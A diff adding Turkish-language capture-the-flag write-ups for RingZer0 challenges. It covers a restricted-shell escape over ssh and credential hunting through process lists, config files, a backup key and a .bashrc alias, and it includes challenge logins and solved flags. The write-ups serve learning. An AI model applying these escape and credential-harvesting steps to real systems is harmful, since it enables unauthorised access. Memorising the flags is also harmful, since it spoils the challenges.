@@ -344,3 +344,192 @@ https://gchq.github.io/ dan From Morse Code seçilir. Ses dosyasında çıkartt�
 ..-. .-.. .- --. -.. --- -. -. . -- --- .. - .- .--- .- -- -... .
 
 FLAGDONNEMOITAJAMBE
+
+https://ringzer0ctf.com/challenges/252
+I love cat! Do you?
+User: cat
+Password: cat
+ssh challenges.ringzer0team.com:10252
+
+
+ssh ile bağlandım.
+ssh cat@challenges.ringzer0team.com -p 10252 
+ls -la komutu sonucu .bash_profile / commands(dizin)/ flag.txt(flagımız) görülüyor.
+cat flag.txt
+*WHERE IS FLAG? **
+vim ile açmayı deneyelim vim flag.txt
+-rbash: vim: command not found
+
+Hımm . Demek ki restrictshell ile korunmakta.
+Bu gibi jail bash escape durumlarında cd,pwd,ls,cat,tee vs. komutlar denenir.
+pwd  >> /home/cat
+cat .bash_profile
+__
+# cat /home/localuser/.bash_profile
+# .bash_profile
+
+# Get the aliases and functions
+if [ -f ~/.bashrc ]; then
+. ~/.bashrc
+fi
+# User specific environment and startup programs
+PATH=$HOME/commands
+export PATH
+__
+
+echo $SHELL
+/bin/rbash
+echo $PATH
+/home/cat/commands
+
+çalıştırmamıza izin verilen komutlar commands dizini içerisinde
+ls -la commands/
+cat 
+ls
+
+https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
+Bu sunumdan daha evvel faydalanmıştım. Bu vaka işe yaramadı.
+Ben de araştırıp JohnHammond ın videosundan yararlandım.(https://youtu.be/MEGBY3XAe_4?t=541)
+
+ssh cat@challenges.ringzer0team.com -p 10252 "sh"   //Görüldüğü gibi sh shelline ssh ile bağlantı kurulumu sırasında giriş yapıyoruz.Bundan sonra vim ile flag.txt e göz atma işi kaldı.
+vim flag.txt
+FLAG-0K14eDrm4t5g7KD54X8Dl3NNcZ956oCK
+
+https://ringzer0ctf.com/challenges/89
+Find Trinity password
+
+User: morpheus
+Password: VNZDDLq2x9qXCzVdABbR1HOtz
+
+ssh challenge.ringzer0team.com -p 10089
+
+arkaplanda hangi süreçler çalışmakta bakalım
+
+ps aux
+.
+.
+.
+root 143 0.0 0.0 4504 768 ?  S  Apr01 3:35 /bin/sh /root/files/backup.sh -u trinity -p Flag-7e0cfcf090a2fe53c97ea3edd3883d0d
+.
+.
+.
+
+Trinity nin parolasını bulduk.Yani flagımızı.
+Flag-7e0cfcf090a2fe53c97ea3edd3883d0d
+
+https://ringzer0ctf.com/challenges/148
+Find architect password
+
+User: morpheus
+Password: VNZDDLq2x9qXCzVdABbR1HOtz
+
+ssh morpheus:VNZDDLq2x9qXCzVdABbR1HOtz@challenges.ringzer0team.com -p 10148
+
+grep -R password / | grep architect   (bütün klasörlerde ve altklasörlerde içinde password ve architect geçenleri aratıyoruz)
+.
+.
+.
+grep: /etc/skel: Permission denied/etc/fstab:#//TheMAtrix/phone  /media/Matrix  cifs  username=architect,password=$(base64 -d "RkxBRy0yMzJmOTliNDE3OGJkYzdmZWY3ZWIxZjBmNzg4MzFmOQ=="),iocharset=utf8,sec=ntlm  0  0
+.
+.
+.
+password=$(base64 -d "RkxBRy0yMzJmOTliNDE3OGJkYzdmZWY3ZWIxZjBmNzg4MzFmOQ==")
+Görüldüğü gibi parola base64 ile şifrelenmiş.Hemen çözelim.
+
+python -c 'print("RkxBRy0yMzJmOTliNDE3OGJkYzdmZWY3ZWIxZjBmNzg4MzFmOQ==".decode("base64"))'
+FLAG-232f99b4178bdc7fef7eb1f0f78831f9
+
+https://ringzer0ctf.com/challenges/152
+
+Dig for flag.
+
+User: architect
+Password: architect password found in previous challenge  (öncekinde bulmuştuk.)
+Password:FLAG-232f99b4178bdc7fef7eb1f0f78831f9
+
+ssh architect@challenges.ringzer0team.com -p 10152
+
+cat /var/www/index.php
+veritabanı bilgileri görünmekte__
+//ENTER THE RELEVANT INFO BELOW
+$mysqlDatabaseName ="arch";
+$mysqlUserName ="arch";
+$mysqlPassword ="asdftgTst5sdf6309sdsdff9lsdftz";
+$mysqlHostName ="127.0.0.1";
+$mysqlExportPath ="/var/tmp/ar.sql";
+__
+
+mysql>select database();
+arch
+
+mysql>use arch
+Database changed
+
+mysql>show tables;
++----------------+
+| Tables_in_arch |
++----------------+
+| arch           |
+| flag           |
++----------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from flag;
++---------------------------------------+
+| flag                                  |
++---------------------------------------+
+| FLAG-55548fdb24a6ef248d8fdfde2720f6bd |
++---------------------------------------+
+1 row in set (0.00 sec)
+
+https://ringzer0ctf.com/challenges/146
+Get access to the oracle account.
+
+User: morpheus
+Password: VNZDDLq2x9qXCzVdABbR1HOtz
+
+ssh morpheus@challenges.ringzer0team.com -p 10146
+Bu sefer oracle ın hesabına erişmemizi istemiş.Parola bulmakla uğraşmıyacağız.
+yedekleme dizininde dosyalardan birinin içeriği ilgimi çekiyor
+cat /backup/c074fa6ec17bb35e168366c43cf4cd19
+
+id_rsa olarak kayıt edelim.(ekte vardır.)
+
+chmod 700 id_rsa
+
+ssh -i id_rsa oracle@challenges.ringzer0team.com -p 10146
+
+ls -la
+flag.txt 
+
+python -c 'print("RkxBRy1kMzI1ZTczOGZhN2Q4N2Q0ZjU2MDdjMzAyYjM3ZGIyMA==".decode("base64"))'
+
+FLAG-d325e738fa7d87d4f5607c302b37d
+
+https://ringzer0ctf.com/challenges/149
+
+Decrypt the oracle encrypted file
+
+User: oracle
+
+Bizden oracle kullanıcısının ana dizininde karşılaştığımız şifrelenmiş bir dosyayı çözmemizi istiyor.
+
+
+cat encflag.txt.enc 
+U2FsdGVkX18is+uZ3KuK4LEDnSakI1egeqP4HmDLROxMv+1GQjwqyCRA81gbNk1b
+KYSxpVcAxEo6VXsonVdMcQ==
+
+encflag.txt.enc ....1b den sonra paragraf başı yapmış.Oysaki encflag.txt.enc  içeriği şöyle olmalıydı:
+
+U2FsdGVkX18is+uZ3KuK4LEDnSakI1egeqP4HmDLROxMv+1GQjwqyCRA81gbNk1bKYSxpVcAxEo6VXsonVdMcQ==   (şeklinde kaydediyoruz.)
+
+Bir ipucu arayalım. 
+cat .bashrc (oturum açılırken başlangıçta yapılan otomatize işlemler.)
+...
+alias reveal="openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k 'lp6PWgOwDctq5Yx7ntTmBpOISc'"
+...
+
+openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k 'lp6PWgOwDctq5Yx7ntTmBpOISc'
+FLAG-54e7f8d0ea560fa7ed98e832900fc45b
+
+
